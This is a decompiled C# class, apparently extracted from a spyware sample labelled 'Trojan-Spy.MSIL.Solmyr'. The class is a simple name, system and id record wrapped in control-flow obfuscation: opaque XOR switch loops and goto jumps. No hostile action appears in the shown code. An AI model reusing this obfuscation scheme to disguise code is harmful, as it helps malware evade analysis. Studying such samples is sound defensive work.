// Decompiled with JetBrains decompiler
// Type: RestrictedErrorObject.CCMDictionary
// Assembly: HStringMarshaler, Version=48.18.3.2, Culture=neutral, PublicKeyToken=null
// MVID: C9C3DCB9-2BA4-424F-9339-2594708EFA64
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Solmyr.gen-61b469d1f7dd980add5fef67a976c5ede46680ae91ab253e216d5e99d2b91992.exe

namespace RestrictedErrorObject
{
  public class CCMDictionary
  {
    private string charName;
    private string cSystem;
    private int cId;

    public CCMDictionary()
    {
    }

    public CCMDictionary(string Name, string System)
    {
label_1:
      int num1 = 242321666;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 126941447)) % 4U)
        {
          case 0:
            this.charName = Name;
            num1 = (int) num2 * -893271771 ^ -1215505236;
            continue;
          case 1:
            num1 = (int) num2 * -1415047677 ^ 491244944;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_5;
        }
      }
label_5:
      this.cSystem = System;
    }

    public int Id
    {
      get
      {
label_1:
        int num1 = -322859424;
        int cId;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1263546830)) % 3U)
          {
            case 0:
              goto label_1;
            case 2:
              cId = this.cId;
              num1 = (int) num2 * -269903431 ^ 850063171;
              continue;
            default:
              goto label_4;
          }
        }
label_4:
        return cId;
      }
      set => this.cId = value;
    }

    public string Name
    {
      get
      {
label_1:
        int num1 = -204634389;
        string charName;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -807736558)) % 4U)
          {
            case 0:
              num1 = (int) num2 * 710223764 ^ -1185083131;
              continue;
            case 1:
              charName = this.charName;
              num1 = (int) num2 * -1566675533 ^ -346352423;
              continue;
            case 2:
              goto label_1;
            default:
              goto label_5;
          }
        }
label_5:
        return charName;
      }
      set => this.charName = value;
    }

    public string System
    {
      get
      {
        string cSystem = this.cSystem;
label_1:
        int num1 = -1365251370;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1409194224)) % 3U)
          {
            case 1:
              num1 = (int) num2 * 1587400812 ^ 1685592841;
              continue;
            case 2:
              goto label_1;
            default:
              goto label_4;
          }
        }
label_4:
        return cSystem;
      }
      set => this.cSystem = value;
    }
  }
}
